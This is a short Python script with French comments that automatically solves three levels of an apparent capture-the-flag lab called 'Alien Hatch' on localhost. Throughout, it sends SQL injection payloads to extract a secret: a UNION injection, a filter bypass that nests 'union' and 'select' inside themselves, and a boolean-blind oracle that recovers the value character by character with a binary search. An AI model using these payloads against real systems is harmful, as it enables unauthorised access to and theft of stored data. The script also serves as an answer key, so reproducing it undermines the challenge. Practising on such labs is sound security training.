#!/usr/bin/env python3
"""Résolution automatique des 3 niveaux d'Alien Hatch.

Usage : python solve.py [http://localhost:8010]
"""
import sys

import requests

URL = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8010").rstrip("/")
SUB = "SELECT value FROM secrets WHERE label='drapeau'"


def level1():
    payload = "x' UNION SELECT (" + SUB + "),0,0-- -"
    r = requests.post(URL + "/feed", data={"food": payload})
    return r.json()["digested"][0]["name"]


def level2():
    # Le filtre retire 'union'/'select' en une passe : on les imbrique pour
    # les reconstituer. Pas de sous-requete SELECT (elle serait filtree aussi).
    payload = ("x' UNIunionON SELselectECT value,0,0 "
               "FROM secrets WHERE label='drapeau'-- -")
    r = requests.post(URL + "/feed2", data={"food": payload})
    return r.json()["digested"][0]["name"]


def oracle(condition):
    payload = "Nebulonite' AND (" + condition + ")-- -"
    r = requests.post(URL + "/feed3", data={"food": payload})
    return r.json().get("status") == "ok"


def level3():
    length = 1
    while not oracle("length((" + SUB + "))=" + str(length)):
        length += 1
        if length > 128:
            raise RuntimeError("longueur introuvable")
    out = []
    for i in range(1, length + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            cond = "unicode(substr((" + SUB + ")," + str(i) + ",1))>" + str(mid)
            if oracle(cond):
                lo = mid + 1
            else:
                hi = mid
        out.append(chr(lo))
    return "".join(out)


if __name__ == "__main__":
    print("Niveau 1 :", level1())
    print("Niveau 2 :", level2())
    print("Niveau 3 :", level3())
